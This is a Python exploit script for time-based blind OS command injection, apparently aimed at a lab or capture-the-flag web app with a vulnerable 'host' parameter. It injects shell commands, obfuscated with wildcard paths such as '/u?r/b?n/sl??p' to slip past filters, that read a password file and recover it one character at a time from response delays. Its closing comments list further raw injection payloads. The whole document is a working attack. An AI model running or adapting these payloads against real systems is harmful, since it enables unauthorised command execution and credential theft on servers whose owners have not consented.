
from time import sleep
import requests
import argparse
from os import sys
from typing import Dict
from urllib3.util import SKIP_HEADER
from urllib.parse import quote
from collections import OrderedDict
from copy import deepcopy

def parse_args():
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url",  help="Remote URL", type=str, dest="url")
    
    args = parser.parse_args()
    
    url:str = args.url
    
    if url is None or url == "":
        print("URL PARAMETER NOT PROVIDED")
        sys.exit(-1)
    
    return url

def make_get_request(url:str, 
                     timeout=10):
    ret_val:bool = False
    
    try:
        # reset default headers
        headers = OrderedDict({
            "Host": SKIP_HEADER,
            "User-Agent": SKIP_HEADER,
            "Accept-Encoding": SKIP_HEADER,
        })

        # add the desired headers here in order, duplicate keys are not possible
        headers.update(OrderedDict([
            ("Host", "injection.com"),
            ("Accept", "*/*"),
            ("User-Agent", "Should come last"),
        ]))

        response:requests.Response = requests.get(url=url, timeout=timeout, headers=headers)
        if response.status_code != 200:
            print(response.status_code)
            return False
    except:
        ret_val = True
        sleep(1.1)
    
    return ret_val

def determine_password_length(url:str, timeout=10):
    
    sleep:int = timeout + 1
    for i in range(0, 100):
        # COMMAND '/u?r/b?n/ca? /etc/password.txt | wc -c | { read l; [ $l -eq '+str(i)+' ] && /u?r/b?n/sl??p '+str(sleep)+'; }'
        full_url = deepcopy(url) + "?host=127.0.0.1%3B+%2Fu%3Fr%2Fb%3Fn%2Fca%3F+%2Fetc%2Fpassword.txt+|+wc+-c+|+{+read+l%3B+[+%24l+-eq+"+str(i)+"+]+%26%26+%2Fu%3Fr%2Fb%3Fn%2Fsl%3F%3Fp+"+str(sleep)+"%3B+}"
        print(f"Attempting password length: {i}")
        if make_get_request(full_url, timeout):
            print(f"PASSWORD LENGTH FOUND!! ({i})")
            return i
    return -1

def determine_password_request(url:str, 
                               timeout:int,
                               len:int, 
                               char_code:int, 
                               sleep:int,
                               operator:str):    
    #COMMAND '/u?r/b?n/t?il -c +'+str(len)+' /etc/password.txt | /u?r/b?n/h?ad -c 1 | { read v; [ $v = "'+chr(char_code)+'" ] && /u?r/b?n/sl??p '+str(sleep)+'; }'
    url = deepcopy(url) + '?host=127.0.0.1%3B+%2Fu%3Fr%2Fb%3Fn%2Ft%3Fil+-c+%2B'+str(len)+'+%2Fetc%2Fpassword.txt+|+%2Fu%3Fr%2Fb%3Fn%2Fh%3Fad+-c+1+|+{+read+v%3B+[+%24v+%3D+"'+quote(chr(char_code), safe='')+'"+]+%26%26+%2Fu%3Fr%2Fb%3Fn%2Fsl%3F%3Fp+'+str(sleep)+'%3B+}'
    print(f"Attempting to see if ascii-code={char_code} ({chr(char_code)}) is '{operator}' than the unknown character at position {len}")
    return make_get_request(url, timeout)


def linear_search_determine_password(url:str, password_len:int, timeout=10):
    sleep:int = timeout + 1
    password:str = ""
    for len in range(1, password_len):

        found_for_len = False

        for char_code in range(48, 126):
            if determine_password_request(url, timeout, len, char_code, sleep, "="):
                print("CHARACTER FOUND!! " + chr(char_code) + " is the character at postion " + str(len))
                password += chr(char_code)
                found_for_len = True
                print("PASSWORD: " + password)
                break

        if found_for_len == False:
            return "NOT FOUND"

    return password

url:str = parse_args()
timeout = 5
password = linear_search_determine_password(url, determine_password_length(url, timeout), timeout)

print(f"PASSWORD FOUND: {password}")

# 127.0.0.1; /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "@" ] && /u?r/b?n/sl??p 11 || /u?r/b?n/?s; }
# 192.168.1.153; /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "a" ] && /u?r/b?n/sl??p 11 || /u?r/b?n/?s; }
# 127.0.0.1; [ 1 -eq 2 ] && /u?r/b?n/sl??p 5 || /u?r/b?n/?s;
# head -c 1 pass.txt | { read v; [ "$v" == "p" ] && /u?r/b?n/sl??p 5 || /u?r/b?n/ls; }
# /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "p" ] && /u?r/b?n/sl??p 5 || /u?r/b?n/?s; }
# /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "p" ] && /u?r/b?n/?s || /u?r/b?n/sl??p 5; }